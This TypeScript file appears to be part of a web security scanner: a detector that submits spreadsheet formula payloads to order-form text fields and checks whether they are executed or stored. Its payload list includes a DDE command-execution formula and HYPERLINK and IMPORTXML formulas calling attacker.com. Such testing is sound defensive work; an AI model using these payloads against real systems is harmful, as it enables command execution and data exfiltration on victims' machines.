/**
 * Formula Injection Detector
 * Detects Excel/spreadsheet formula injection in order fields
 */

import { BaseDetector } from '../base/BaseDetector';
import {
    DetectorResult,
    AttackSurface,
    PlatformDetectionResult,
    Parameter,
    Endpoint
} from '../../types';

export class FormulaInjectionDetector extends BaseDetector {
    private formulaPayloads: Array<{ payload: string; type: string; severity: 'MEDIUM' | 'HIGH' | 'CRITICAL' }> = [
        { payload: '=1+1', type: 'basic_arithmetic', severity: 'MEDIUM' },
        { payload: '=SUM(A1:A10)', type: 'excel_function', severity: 'MEDIUM' },
        { payload: '=HYPERLINK("http://attacker.com","Click")', type: 'hyperlink', severity: 'HIGH' },
        { payload: '@SUM(A1:A10)', type: 'libreoffice', severity: 'MEDIUM' },
        { payload: '+1+1', type: 'google_sheets', severity: 'MEDIUM' },
        { payload: '-1+1', type: 'google_sheets_alt', severity: 'MEDIUM' },
        { payload: '=1+1+cmd|"/c calc"!A1', type: 'dde_injection', severity: 'CRITICAL' },
        { payload: '=IMPORTXML("http://attacker.com/xxe","//x")', type: 'xxe_via_formula', severity: 'CRITICAL' },
        { payload: '|calc', type: 'pipe_injection', severity: 'CRITICAL' },
    ];

    constructor() {
        super('formula-injection', 'price-manipulation');
    }

    async test(
        attackSurface: AttackSurface,
        platform: PlatformDetectionResult
    ): Promise<DetectorResult[]> {
        const results: DetectorResult[] = [];
        const textParams = this.getRelevantParameters(attackSurface);

        this.log('Starting formula injection detection', { paramCount: textParams.length });

        const startTime = Date.now();
        const MAX_DURATION_MS = 60000; // 1 minute max for this detector

        // Optimization: Only use a subset of payloads for general scanning
        // 1. Basic arithmetic (Excel/Sheets)
        // 2. DDE Injection (Critical)
        const activePayloads = [
            this.formulaPayloads.find(p => p.type === 'basic_arithmetic')!,
            this.formulaPayloads.find(p => p.type === 'dde_injection')!
        ];

        for (const attackParam of attackSurface.parameters) {
            // Global timeout check
            if (Date.now() - startTime > MAX_DURATION_MS) {
                this.log(`FormulaInjectionDetector timeout reached (${MAX_DURATION_MS}ms). Stopping early.`);
                break;
            }

            if (!this.isTextParam(attackParam.parameter)) continue;

            const endpoints = this.getEndpointsWithParam(attackSurface, attackParam.parameter.name);

            // Optimization: Limit to first 3 endpoints per parameter to avoid redundancy
            for (const endpoint of endpoints.slice(0, 3)) {
                for (const formula of activePayloads) {
                    const result = await this.testFormula(endpoint, attackParam.parameter, formula);
                    if (result.vulnerable) {
                        results.push(result);
                        break; // One formula vulnerability per param is enough
                    }
                }
            }
        }

        return results;
    }

    protected getRelevantParameters(attackSurface: AttackSurface): Parameter[] {
        return attackSurface.parameters
            .map(ap => ap.parameter)
            .filter(p => this.isTextParam(p));
    }

    private isTextParam(param: Parameter): boolean {
        // Focus on text fields that might appear in exports
        const textFieldPatterns = /name|note|comment|description|message|address|memo|instruction/i;
        return param.type === 'string' && textFieldPatterns.test(param.name);
    }

    private getEndpointsWithParam(attackSurface: AttackSurface, paramName: string): Endpoint[] {
        return attackSurface.endpoints
            .map(ae => ae.endpoint)
            .filter(e => e.parameters.some(p => p.name === paramName));
    }

    private async testFormula(
        endpoint: Endpoint,
        param: Parameter,
        formula: { payload: string; type: string; severity: 'MEDIUM' | 'HIGH' | 'CRITICAL' }
    ): Promise<DetectorResult> {
        const testResult = await this.testPayload(
            endpoint,
            param.name,
            param.value,
            formula.payload
        );

        // Check for formula execution or storage
        let executed = false;
        let stored = false;

        const responseBody = testResult.exploitResponse.body;

        // Check if formula was executed (e.g., =1+1 became 2)
        if (formula.payload === '=1+1' && responseBody.includes('2') && !responseBody.includes('=1+1')) {
            executed = true;
            testResult.evidence.push('Formula appears to have been executed (=1+1 → 2)');
        }

        // Check for formula error messages
        const errorPatterns = ['#NAME?', '#VALUE!', '#REF!', '#DIV/0!', 'formula error'];
        if (errorPatterns.some(err => responseBody.toLowerCase().includes(err.toLowerCase()))) {
            executed = true;
            testResult.evidence.push('Formula error message detected');
        }

        // Check if formula was stored (not sanitized)
        if (responseBody.includes(formula.payload)) {
            stored = true;
            testResult.evidence.push('Formula payload stored in response');
        }

        const vulnerable = executed || (stored && testResult.exploitable);

        return this.createResult('formula_injection', vulnerable, formula.severity, {
            parameter: param.name,
            endpoint: endpoint.url,
            originalValue: param.value,
            exploitValue: formula.payload,
            evidence: testResult.evidence,
            confidence: executed ? 0.95 : (stored ? 0.7 : testResult.confidence),
            impact: executed
                ? `Formula executed on server - potential for ${formula.type} attack`
                : stored
                    ? 'Formula stored for later execution when exported to CSV/Excel'
                    : 'Formula injection may be possible',
        });
    }
}
